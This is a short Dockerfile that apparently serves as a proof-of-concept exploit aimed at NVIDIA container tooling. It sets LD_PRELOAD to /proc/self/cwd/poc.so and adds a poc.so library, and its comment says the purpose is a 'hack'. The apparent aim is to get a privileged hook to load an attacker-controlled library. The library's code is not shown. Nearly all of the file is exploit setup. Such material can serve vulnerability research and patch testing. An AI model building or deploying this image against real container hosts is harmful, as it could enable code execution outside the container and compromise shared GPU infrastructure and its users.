# Use Ubuntu as base image since nvidia-ctk installation requires package management
FROM ubuntu:22.04

# Set environment variables to avoid interactive prompts during installation
ENV DEBIAN_FRONTEND=noninteractive

# Update package list and install necessary dependencies
RUN apt-get update && apt-get install -y \
    curl \
    gnupg \
    ca-certificates \
    wget

# Update package list with new repository
RUN apt-get update

# Install specific version of nvidia-container-toolkit (which includes nvidia-ctk)
#RUN apt-get install -y nvidia-container-toolkit=1.17.7-1 \
    #&& apt-mark hold nvidia-container-toolkit

# Include original poc.so file and environment variable for hack
ENV LD_PRELOAD=/proc/self/cwd/poc.so
#ENV LD_PRELOAD=/proc/self/cwd/poc.so
ADD poc.so /
